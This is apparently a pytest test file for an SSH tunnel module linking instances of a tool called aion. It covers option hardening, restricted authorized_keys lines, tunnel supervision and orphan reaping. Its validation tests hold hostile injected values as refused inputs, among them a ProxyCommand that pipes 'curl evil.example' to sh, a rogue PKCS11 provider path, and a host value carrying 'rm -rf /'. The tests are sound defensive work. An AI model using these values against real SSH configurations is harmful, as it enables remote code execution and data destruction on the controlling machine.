"""Tests for sshlink — SSH transport between aion instances.

Two independent strategies, because each catches what the other cannot:

  1. `ssh -G` asks the REAL ssh binary what our argv actually means. This is
     how the ClearAllForwardings bug was caught: the argv looked right, and ssh
     read it as "forward nothing". Asserting our own string would have agreed
     with the bug.
  2. A fake `ssh` that just binds the port exercises the supervisor (start,
     readiness, death, backoff, reaping) with no network and no sshd.
"""
from __future__ import annotations

import json
import shutil
import socket
import subprocess
import time
from pathlib import Path

import pytest

from aion import sshlink
from aion.sshlink import (
    SSHPeer, SSHTunnel, TunnelPool, authorized_keys_line, build_argv,
    describe, free_local_port, load_peers, port_open, retry_delay,
    save_peers, validate_peer,
)


def peer(**kw) -> SSHPeer:
    base = dict(id="pi5", host="10.0.0.5", user="gio", remote_port=8765)
    base.update(kw)
    return SSHPeer(**base)


# ── Validation: argv injection ───────────────────────────────────────────────
@pytest.mark.parametrize("field,value", [
    ("host", "-oProxyCommand=curl evil.example|sh"),
    ("user", "-oProxyCommand=id"),
    ("key", "-oPKCS11Provider=/tmp/evil.so"),
])
def test_leading_dash_is_refused(field, value):
    """ssh reads any argv element starting with '-' as an option, wherever it
    sits. A peer config is therefore code execution on the CONTROLLER unless
    this is checked -- passing a list instead of a shell does not help."""
    problems = validate_peer(peer(**{field: value}))
    assert problems
    assert any("'-'" in p for p in problems)


def test_shell_metacharacters_refused_in_host():
    assert validate_peer(peer(host="10.0.0.5; rm -rf /"))


def test_valid_peer_has_no_problems(tmp_path):
    key = tmp_path / "id_ed25519"
    key.write_text("x")
    assert validate_peer(peer(key=str(key))) == []


def test_missing_key_file_is_a_problem(tmp_path):
    assert any("not found" in p for p in validate_peer(
        peer(key=str(tmp_path / "nope"))))


def test_all_problems_reported_not_just_the_first():
    problems = validate_peer(SSHPeer(id="", host="", ssh_port=0))
    assert len(problems) >= 3


def test_port_range_checked():
    assert any("ssh_port" in p for p in validate_peer(peer(ssh_port=99999)))
    assert any("remote_port" in p for p in validate_peer(peer(remote_port=0)))


# ── argv ─────────────────────────────────────────────────────────────────────
def test_local_end_is_pinned_to_loopback():
    """A bare `-L 8900:...` honours GatewayPorts. Re-exposing the fleet on the
    LAN is the exact thing the tunnel exists to prevent."""
    argv = build_argv(peer(), 8900)
    assert "-L" in argv
    assert argv[argv.index("-L") + 1] == "127.0.0.1:8900:127.0.0.1:8765"


def test_remote_end_is_the_remote_loopback():
    """So the remote RemoteServer never has to bind a public interface."""
    spec = build_argv(peer(remote_port=8770), 8900)[
        build_argv(peer(remote_port=8770), 8900).index("-L") + 1]
    assert spec.endswith(":127.0.0.1:8770")


def test_double_dash_before_target():
    argv = build_argv(peer(), 8900)
    assert argv[-2] == "--"
    assert argv[-1] == "gio@10.0.0.5"


def test_no_user_means_bare_host():
    assert build_argv(peer(user=""), 8900)[-1] == "10.0.0.5"


def test_key_implies_identities_only(tmp_path):
    """Without IdentitiesOnly, ssh offers every key in the agent to a machine
    that needs exactly one -- an identity leak to every peer."""
    key = tmp_path / "k"
    key.write_text("x")
    argv = build_argv(peer(key=str(key)), 8900)
    assert "IdentitiesOnly=yes" in argv
    assert argv[argv.index("-i") + 1] == str(key)


def test_no_key_means_no_dash_i():
    assert "-i" not in build_argv(peer(key=""), 8900)


def test_batchmode_and_exit_on_forward_failure():
    argv = build_argv(peer(), 8900)
    assert "BatchMode=yes" in argv          # a daemon cannot answer a prompt
    assert "ExitOnForwardFailure=yes" in argv  # else ssh lives, forward doesn't


def test_agent_and_x11_forwarding_off():
    argv = build_argv(peer(), 8900)
    assert "ForwardAgent=no" in argv
    assert "ForwardX11=no" in argv


def test_ssh_port_only_passed_when_non_default():
    assert "-p" not in build_argv(peer(ssh_port=22), 8900)
    assert build_argv(peer(ssh_port=2222), 8900)[
        build_argv(peer(ssh_port=2222), 8900).index("-p") + 1] == "2222"


def test_host_key_checking_never_disabled(monkeypatch):
    """`no` would silently accept a swapped host key, which is the attack."""
    for value in ("", "0", "no", "1", "yes", "true", "garbage"):
        monkeypatch.setenv("AION_SSH_STRICT", value)
        assert sshlink.strict_host_key_checking() in {"yes", "accept-new"}


def test_strict_env_requires_known_host(monkeypatch):
    monkeypatch.setenv("AION_SSH_STRICT", "yes")
    assert "StrictHostKeyChecking=yes" in build_argv(peer(), 8900)
    monkeypatch.delenv("AION_SSH_STRICT")
    assert "StrictHostKeyChecking=accept-new" in build_argv(peer(), 8900)


# ── argv, verified against the real ssh binary ───────────────────────────────
needs_ssh = pytest.mark.skipif(shutil.which("ssh") is None, reason="no ssh")


def effective_config(argv: list[str]) -> dict[str, list[str]]:
    """What ssh itself thinks our command line means.

    `-G` prints the resolved configuration and exits without connecting, so
    this validates intent against the real parser with no network at all.
    """
    out = subprocess.run(argv[:1] + ["-G"] + argv[1:], capture_output=True,
                         text=True, timeout=20).stdout
    conf: dict[str, list[str]] = {}
    for line in out.splitlines():
        key, _, value = line.partition(" ")
        conf.setdefault(key.lower(), []).append(value)
    return conf


@needs_ssh
def test_ssh_actually_sees_the_forward():
    """The regression test for ClearAllForwardings: that option made ssh drop
    our own -L, so the tunnel would connect and forward nothing. Only the real
    parser can catch a mistake of that shape."""
    conf = effective_config(build_argv(peer(), 8900))
    assert conf.get("localforward") == ["[127.0.0.1]:8900 [127.0.0.1]:8765"]
    assert conf.get("clearallforwardings") == ["no"]


@needs_ssh
def test_ssh_actually_sees_the_safety_options():
    conf = effective_config(build_argv(peer(), 8900))
    assert conf["batchmode"] == ["yes"]
    assert conf["exitonforwardfailure"] == ["yes"]
    assert conf["forwardagent"] == ["no"]
    assert conf["forwardx11"] == ["no"]
    assert conf["stricthostkeychecking"] == ["accept-new"]


@needs_ssh
def test_ssh_parses_target_as_hostname_not_option():
    """The injection test, end to end: a hostile host must never become an
    option even if validation is bypassed, because of the `--`."""
    argv = build_argv(SSHPeer(id="x", host="10.0.0.9"), 8900)
    assert effective_config(argv)["hostname"] == ["10.0.0.9"]


# ── authorized_keys ──────────────────────────────────────────────────────────
def test_authorized_key_line_is_restricted():
    """`restrict` turns everything off; `port-forwarding` puts back the one
    capability a peer needs and `permitopen` narrows it to one destination.
    The key can reach aion on that host or nothing -- no shell, no pivot."""
    line = authorized_keys_line("ssh-ed25519 AAAA test@host", 8765)
    assert line.startswith("restrict,")
    assert 'permitopen="127.0.0.1:8765"' in line
    assert line.endswith("ssh-ed25519 AAAA test@host")


def test_the_line_actually_permits_forwarding():
    """The bug this file used to assert was correct behaviour.

    `permitopen` does NOT re-enable forwarding -- it only restricts forwarding
    that is already allowed. `restrict,permitopen=...` alone means sshd answers
    every tunnel with "administratively prohibited", which `peers test` reports
    as "tunnel up but no aion answered": a message that sends you looking at
    the listener, the port and the token, none of which are the problem.

    Found by linking a real peer. The old assertions all passed.
    """
    line = authorized_keys_line("k", 8765)
    opts = line.split(" ")[0].split(",")
    assert "port-forwarding" in opts, (
        "restrict without port-forwarding disables the tunnel entirely")
    assert opts.index("restrict") < opts.index("port-forwarding"), (
        "restrict must come first or it re-disables the forwarding")


def test_authorized_key_line_honours_remote_port():
    assert 'permitopen="127.0.0.1:9001"' in authorized_keys_line("k", 9001)


def test_authorized_key_line_can_pin_source():
    line = authorized_keys_line("k", 8765, source="10.0.0.2")
    assert line.startswith('from="10.0.0.2",restrict,')


# ── Peer store ───────────────────────────────────────────────────────────────
@pytest.fixture
def home(tmp_path, monkeypatch):
    monkeypatch.setattr(sshlink, "AION_HOME", tmp_path)
    return tmp_path


def test_roundtrip(home):
    save_peers([peer(), peer(id="box", host="box.local")])
    assert [p.id for p in load_peers()] == ["pi5", "box"]


def test_missing_file_is_empty(home):
    assert load_peers() == []


def test_corrupt_file_is_empty_not_fatal(home):
    (home / "peers.json").write_text("{not json")
    assert load_peers() == []


def test_invalid_peers_dropped_good_ones_kept(home):
    """One bad line must not take the fleet down with it."""
    (home / "peers.json").write_text(json.dumps({"peers": [
        {"id": "evil", "host": "-oProxyCommand=id"},
        peer().as_dict(),
    ]}))
    assert [p.id for p in load_peers()] == ["pi5"]


def test_duplicate_ids_collapse(home):
    (home / "peers.json").write_text(json.dumps({"peers": [
        peer().as_dict(), peer(host="other.local").as_dict()]}))
    peers = load_peers()
    assert len(peers) == 1 and peers[0].host == "10.0.0.5"


def test_bare_list_accepted(home):
    (home / "peers.json").write_text(json.dumps([peer().as_dict()]))
    assert len(load_peers()) == 1


# ── Ports ────────────────────────────────────────────────────────────────────
def test_free_local_port_is_actually_free():
    port = free_local_port()
    assert not port_open(port)
    with socket.socket() as s:
        s.bind(("127.0.0.1", port))


def test_free_local_port_skips_a_bound_one():
    with socket.socket() as taken:
        taken.bind(("127.0.0.1", 0))
        taken.listen(1)
        busy = taken.getsockname()[1]
        assert free_local_port(start=busy, span=20) != busy


def test_port_open_detects_a_listener():
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        s.listen(1)
        assert port_open(s.getsockname()[1])


# ── Tunnel supervision, with a fake ssh ──────────────────────────────────────
@pytest.fixture
def fake_ssh(tmp_path):
    """An `ssh` that parses -L and binds the local end, like the real one.

    Lets the whole supervisor be exercised -- readiness, death, reaping,
    backoff -- with no sshd, no network and no credentials anywhere.
    """
    script = tmp_path / "fake-ssh"
    script.write_text(
        "#!/usr/bin/env python3\n"
        "import socket, sys, time\n"
        "argv = sys.argv[1:]\n"
        "spec = argv[argv.index('-L') + 1]\n"
        "host, port, _, _ = spec.split(':')\n"
        "if '--fail' in argv:\n"
        "    sys.stderr.write('Permission denied (publickey).\\n'); sys.exit(255)\n"
        "s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n"
        "s.bind((host, int(port))); s.listen(8)\n"
        "time.sleep(120)\n"
    )
    script.chmod(0o755)
    return str(script)


@pytest.fixture
def failing_ssh(tmp_path):
    script = tmp_path / "fail-ssh"
    script.write_text(
        "#!/usr/bin/env python3\n"
        "import sys\n"
        "sys.stderr.write('Warning: Permanently added a key\\n')\n"
        "sys.stderr.write('Permission denied (publickey).\\n')\n"
        "sys.exit(255)\n"
    )
    script.chmod(0o755)
    return str(script)


def test_tunnel_comes_up_and_forward_answers(fake_ssh):
    tunnel = SSHTunnel(peer(), ssh_bin=fake_ssh)
    try:
        assert tunnel.start()
        assert tunnel.wait_ready(timeout=10)
        assert tunnel.alive()
        assert port_open(tunnel.local_port)
    finally:
        tunnel.stop()


def test_stop_closes_the_forward(fake_ssh):
    tunnel = SSHTunnel(peer(), ssh_bin=fake_ssh)
    tunnel.start()
    tunnel.wait_ready(timeout=10)
    port = tunnel.local_port
    tunnel.stop()
    assert not tunnel.alive()
    deadline = time.time() + 3
    while port_open(port) and time.time() < deadline:
        time.sleep(0.05)
    assert not port_open(port)


def test_dead_process_is_not_alive_even_before_the_socket_notices(fake_ssh):
    """Liveness is process AND socket. Checking only the pid would call a
    half-open tunnel healthy."""
    tunnel = SSHTunnel(peer(), ssh_bin=fake_ssh)
    tunnel.start()
    tunnel.wait_ready(timeout=10)
    tunnel.proc.kill()
    tunnel.proc.wait()
    assert not tunnel.alive()
    tunnel.stop()


def test_ssh_failure_surfaces_its_own_diagnosis(failing_ssh):
    """ssh's stderr is the most useful string in the whole feature; losing it
    is why a broken peer used to be undebuggable from inside aion."""
    tunnel = SSHTunnel(peer(), ssh_bin=failing_ssh)
    assert tunnel.start()
    assert not tunnel.wait_ready(timeout=5)
    assert "Permission denied" in tunnel.state.last_error
    assert "Permanently added" not in tunnel.state.last_error


def test_invalid_peer_never_spawns(fake_ssh):
    tunnel = SSHTunnel(peer(host="-oProxyCommand=id"), ssh_bin=fake_ssh)
    assert tunnel.start() is False
    assert tunnel.proc is None
    assert "'-'" in tunnel.state.last_error


def test_missing_ssh_binary_is_reported_not_raised():
    tunnel = SSHTunnel(peer(), ssh_bin="definitely-not-a-real-binary")
    assert tunnel.start() is False
    assert "not found" in tunnel.state.last_error


# ── Pool ─────────────────────────────────────────────────────────────────────
def test_pool_brings_peers_up_and_maps_ports(fake_ssh, home):
    pool = TunnelPool(ssh_bin=fake_ssh)
    try:
        states = pool.ensure_all([peer(), peer(id="box", host="box.local")])
        assert all(s.up for s in states)
        assert pool.local_port("pi5") != pool.local_port("box")
        assert port_open(pool.local_port("box"))
    finally:
        pool.close_all()


def test_pool_skips_disabled_peers(fake_ssh, home):
    pool = TunnelPool(ssh_bin=fake_ssh)
    try:
        assert pool.ensure_all([peer(enabled=False)]) == []
        assert pool.local_port("pi5") == 0
    finally:
        pool.close_all()


def test_pool_reuses_a_live_tunnel(fake_ssh, home):
    pool = TunnelPool(ssh_bin=fake_ssh)
    try:
        first = pool.ensure(peer()).local_port
        pid = pool.tunnels["pi5"].proc.pid
        assert pool.ensure(peer()).local_port == first
        assert pool.tunnels["pi5"].proc.pid == pid   # not respawned
    finally:
        pool.close_all()


def test_pool_heals_a_killed_tunnel(fake_ssh, home):
    pool = TunnelPool(ssh_bin=fake_ssh)
    try:
        pool.ensure(peer())
        pool.tunnels["pi5"].proc.kill()
        pool.tunnels["pi5"].proc.wait()
        assert pool.ensure(peer()).up
        assert port_open(pool.local_port("pi5"))
    finally:
        pool.close_all()


def test_pool_closes_a_peer_removed_from_config(fake_ssh, home):
    """A peer deleted from peers.json must not keep a forward open."""
    pool = TunnelPool(ssh_bin=fake_ssh)
    try:
        pool.ensure_all([peer(), peer(id="box", host="box.local")])
        port = pool.local_port("box")
        pool.ensure_all([peer()])
        assert "box" not in pool.tunnels
        deadline = time.time() + 3
        while port_open(port) and time.time() < deadline:
            time.sleep(0.05)
        assert not port_open(port)
    finally:
        pool.close_all()


def test_pool_backs_off_a_failing_peer(failing_ssh, home):
    """A powered-off laptop must not generate a connection per second."""
    pool = TunnelPool(ssh_bin=failing_ssh)
    try:
        assert not pool.ensure(peer(), wait=2).up
        before = pool.tunnels["pi5"].state.attempts
        assert not pool.ensure(peer(), wait=2).up      # inside the backoff
        assert pool.tunnels["pi5"].state.attempts == before
    finally:
        pool.close_all()


def test_backoff_grows_then_caps_but_never_gives_up():
    """It slows down forever rather than stopping, so a peer that reboots comes
    back on its own."""
    delays = [retry_delay(n) for n in range(0, 12)]
    assert delays[0] < delays[3] < delays[6]
    assert max(delays) <= 60.0
    assert min(delays) > 0.0


# ── Bridge ───────────────────────────────────────────────────────────────────
def test_remote_node_points_at_the_local_end():
    """Past this function nothing in aion knows the instance is remote: gates,
    routing and status all use the transport they already used."""
    node = sshlink.to_remote_node(peer(label="Pi"), 8900)
    assert (node.host, node.port, node.id) == ("127.0.0.1", 8900, "pi5")
    assert node.url == "http://127.0.0.1:8900"
    assert node.label == "Pi"


def test_describe_lists_configured_peers_even_when_down(home):
    rows = describe([peer(), peer(id="box", host="box.local", enabled=False)])
    assert [r["id"] for r in rows] == ["pi5", "box"]
    assert rows[0]["up"] is False and rows[0]["local_port"] == 0
    assert rows[1]["enabled"] is False
    assert rows[0]["target"] == "gio@10.0.0.5"


def test_describe_reports_a_live_tunnel(fake_ssh, home):
    pool = TunnelPool(ssh_bin=fake_ssh)
    try:
        pool.ensure(peer())
        row = describe([peer()], pool)[0]
        assert row["up"] is True
        assert row["local_port"] == pool.local_port("pi5")
        assert row["error"] == ""
    finally:
        pool.close_all()


def test_describe_carries_the_error_when_down(failing_ssh, home):
    pool = TunnelPool(ssh_bin=failing_ssh)
    try:
        pool.ensure(peer(), wait=2)
        assert "Permission denied" in describe([peer()], pool)[0]["error"]
    finally:
        pool.close_all()


# ── Routing adapter ──────────────────────────────────────────────────────────
from aion import routing  # noqa: E402


def test_ssh_candidate_is_remote_and_points_at_the_tunnel():
    c = routing.candidates_from_ssh([
        {"id": "pi5", "up": True, "local_port": 8901,
         "status": {"running_count": 1, "active_harness": "claude"}}])[0]
    assert (c.host, c.port) == ("127.0.0.1", 8901)
    assert c.alive is True and c.local is False and c.is_self is False
    assert c.running_count == 1 and c.active_harness == "claude"


def test_tunnel_up_but_aion_dead_is_not_alive():
    """The half-open case: an ssh forward outlives the remote process, so the
    local port keeps accepting while there is nothing behind it. Trusting the
    tunnel alone would route work into a hole."""
    c = routing.candidates_from_ssh([
        {"id": "pi5", "up": True, "local_port": 8901, "status": {}}])[0]
    assert c.alive is False
    assert "not answering" in c.note


def test_down_tunnel_carries_ssh_diagnosis_into_the_rejection():
    cands = routing.candidates_from_ssh([
        {"id": "pi5", "up": False, "local_port": 0, "status": {},
         "error": "Permission denied (publickey)."}])
    verdict = routing.score(cands[0])
    assert verdict.eligible is False
    assert "Permission denied" in verdict.rejection


def test_local_peer_still_says_plain_offline():
    """The note is additive — it must not change the existing message when the
    transport has nothing extra to say."""
    ok, why = routing.eligible(routing.Candidate(id="x", alive=False))
    assert why == "offline"


def test_remote_loses_to_an_equally_idle_local_box():
    """LOCAL_BONUS is the point: a remote box has to be meaningfully more idle
    to be worth the network."""
    local = routing.Candidate(id="here", alive=True, local=True)
    remote = routing.candidates_from_ssh([
        {"id": "pi5", "up": True, "local_port": 8901, "status": {}}])[0]
    remote.alive = True
    assert routing.score(local).score > routing.score(remote).score


def test_a_pinned_ssh_peer_is_still_checked():
    cands = routing.candidates_from_ssh([
        {"id": "pi5", "up": False, "local_port": 0, "status": {},
         "error": "Host key verification failed."}])
    p = routing.plan(cands, target_id="pi5")
    assert p.ok is False and "Host key verification failed" in p.reason


# ── Orphan reaping ───────────────────────────────────────────────────────────
def test_orphaned_tunnel_is_reaped_by_the_next_pool(fake_ssh, home):
    """start_new_session detaches ssh so Ctrl-C cannot sever a request mid
    flight — which means a SIGKILLed cockpit leaks a live SSH session to a
    remote machine, holding a port, with nothing left that knows it exists."""
    orphan = SSHTunnel(peer(), ssh_bin=fake_ssh)
    orphan.start()
    orphan.wait_ready(timeout=10)
    pid, port = orphan.proc.pid, orphan.local_port
    orphan.proc = None                      # the cockpit died; ssh did not

    pool = TunnelPool(ssh_bin=fake_ssh)
    try:
        assert any(str(pid) in line for line in pool.reaped)
        deadline = time.time() + 3
        while port_open(port) and time.time() < deadline:
            time.sleep(0.05)
        assert not port_open(port)
    finally:
        pool.close_all()


def test_reaper_never_kills_a_pid_it_cannot_verify(home):
    """Pids are reused. Killing the wrong process is far worse than leaking a
    tunnel, so /proc must still show ssh carrying that exact forward."""
    import os as _os
    sshlink.tunnels_dir().mkdir(parents=True, exist_ok=True)
    (sshlink.tunnels_dir() / "ghost.json").write_text(
        json.dumps({"pid": _os.getpid(), "local_port": 8999}))
    assert sshlink.reap_orphans() == []      # this process is not ssh
    assert _os.getpid()                       # still here, obviously


def test_reaper_forgets_stale_records(home):
    sshlink.tunnels_dir().mkdir(parents=True, exist_ok=True)
    (sshlink.tunnels_dir() / "gone.json").write_text(
        json.dumps({"pid": 999999, "local_port": 8999}))
    sshlink.reap_orphans()
    assert not (sshlink.tunnels_dir() / "gone.json").exists()


def test_reaper_survives_a_corrupt_record(home):
    sshlink.tunnels_dir().mkdir(parents=True, exist_ok=True)
    (sshlink.tunnels_dir() / "bad.json").write_text("{{{")
    assert sshlink.reap_orphans() == []


def test_stop_clears_the_record(fake_ssh, home):
    tunnel = SSHTunnel(peer(), ssh_bin=fake_ssh)
    tunnel.start()
    assert (sshlink.tunnels_dir() / "pi5.json").exists()
    tunnel.stop()
    assert not (sshlink.tunnels_dir() / "pi5.json").exists()


def test_aion_home_env_is_honoured(tmp_path, monkeypatch):
    """fleet.AION_HOME is fixed at import, so `AION_HOME=/tmp/x aion.sh peers
    add ...` was silently editing the real config."""
    monkeypatch.setenv("AION_HOME", str(tmp_path / "elsewhere"))
    assert sshlink.peers_path() == tmp_path / "elsewhere" / "peers.json"


def test_free_local_port_skips_one_in_time_wait():
    """The probe used SO_REUSEADDR, which accepts a port in TIME_WAIT — and
    ssh, binding without it, is then refused. "Free" has to mean free for the
    process that will actually bind."""
    srv = socket.socket()
    srv.bind(("127.0.0.1", 0))
    srv.listen(1)
    port = srv.getsockname()[1]
    client = socket.socket()
    client.connect(("127.0.0.1", port))
    conn, _ = srv.accept()
    # Closing the SERVER side first is what puts the listening port itself into
    # TIME_WAIT — closing the client side would only strand an ephemeral one.
    conn.close()
    srv.close()
    client.close()
    with pytest.raises(OSError):
        free_local_port(start=port, span=1)
